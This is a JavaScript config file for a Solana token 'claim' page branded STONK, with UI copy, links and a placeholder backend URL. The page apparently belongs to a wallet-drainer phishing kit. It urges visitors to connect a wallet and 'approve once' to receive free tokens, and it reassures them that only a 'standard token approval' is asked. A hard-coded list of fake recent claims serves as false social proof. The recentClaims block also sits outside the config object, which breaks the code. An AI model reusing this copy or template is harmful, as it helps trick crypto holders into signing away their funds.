/**
 * Only file you need to edit when reusing this page for another token.
 * Components read names, colors, copy, chain, and the API URL from here.
 */
const config = {
  tokenName: "STONK",
  ticker: "STONK",
  logoUrl: "/stonk-logo.png",
  tagline: "Tokenized markets. Internet speed. Community owned.",
  heroLines: ["THE MARKET", "NEEDS MORE", "STONK."],
  description:
    "Check your STONK community allocation. Connect your wallet and approve once to receive your tokens.",
  primaryColor: "#c9ff3d",
  accentColor: "#6c5cff",
  backgroundColor: "#080908",
  claimButtonText: "Check & claim STONK",
  connectButtonText: "Connect Solana wallet",
  successMessage: "STONK landed in your wallet",
  backendBaseUrl: "https://your-backend.railway.app",
  tokenAddress: "6GmAFSYs4gk3FDao5FzzySQpPZaWsa4rUJHacpMpUNgx",

  chain: {
    chainName: "Solana",
    network: "mainnet-beta",
    explorerUrl: "https://solscan.io",
  },

  links: [
    { label: "Trade on StonkFun", href: "https://www.stonkfun.xyz/token/6GmAFSYs4gk3FDao5FzzySQpPZaWsa4rUJHacpMpUNgx" },
    { label: "X / Twitter", href: "https://x.com/launchonsf" },
    { label: "Telegram", href: "https://t.me/stonkfunxyz" },
  ],

  facts: [
    { value: "1B", label: "Total supply", note: "On-chain supply" },
    { value: "9", label: "Decimals", note: "Solana SPL token" },
    { value: "SOL", label: "Network", note: "Mainnet" },
  ],

  promo: {
    eyebrow: "THE STONK DROP",
    headline: "Markets are serious. STONK doesn't have to be.",
    body: "STONK is the native token of StonkFun, a Solana launchpad built around markets paired with tokenized equities, currencies, commodities, and internet culture.",
    bullets: [
      "One wallet connection",
      "Quick approval step",
      "Tokens delivered automatically",
    ],
    demoReceipt: {
      eyebrow: "DEMO RECEIPT · UI PREVIEW",
      status: "SENT",
      amount: "10,000",
      ticker: "STONK",
      amountLabel: "Example allocation",
      message: "A real Solana signature and explorer link appear here only after a confirmed claim.",
      signatureLabel: "TRANSACTION",
      signatureValue: "Available after confirmation",
    },
  },

  ui: {
    pageTitle: "Claim $STONK | StonkFun Community Drop",
    kicker: "Live Claim · Solana",
    cardTitle: "Claim your STONK",
    disconnectLabel: "Disconnect",
    connectedLabel: "Connected",
    contractLabel: "Verified Solana mint",
    copyLabel: "Copy",
    copiedLabel: "Copied",
    explorerLabel: "View",
    txLabel: "View transaction",
    preparingText: "Checking your allocation…",
    signingText: "Approve the claim in your wallet…",
    confirmingText: "Waiting for the transaction to confirm…",
    submittingText: "Processing your allocation…",
    preparingButton: "Checking…",
    signingButton: "Approve in wallet",
    confirmingButton: "Confirming…",
    submittingButton: "Sending…",
    retryText: "Try again",
    successKicker: "You're in",
    walletMissingText: "No Solana wallet detected. Install Phantom, Solflare, or Backpack, then refresh.",
    rejectedText: "Approval cancelled. You can try again when you're ready.",
    connectFailedText: "Could not connect the wallet.",
    claimFailedText: "Claim failed. Try again.",
    networkErrorText: "Could not reach the claim service. Check the backend URL and try again.",
    invalidPrepareText: "The claim service returned an unexpected response. Try again later.",
    txFailedText: "The transaction did not confirm. Nothing was sent.",
    footerText: "This site only asks for a standard token approval to process your claim.",
    stepConnect: "Connect",
    stepSign: "Approve",
    stepDone: "Claimed",
  },
};
recentClaims: [
  { wallet: "7GxK...9p2m", amount: "12,450", time: "2 min ago" },
  { wallet: "9pRm...4kL1", amount: "8,200", time: "5 min ago" },
  { wallet: "3vNq...8xT7", amount: "21,800", time: "9 min ago" },
  { wallet: "5hBc...2mP9", amount: "4,150", time: "14 min ago" },
  { wallet: "2kLf...7nR3", amount: "15,600", time: "18 min ago" },
  { wallet: "8tYw...1qA5", amount: "9,870", time: "23 min ago" },
]

export default config;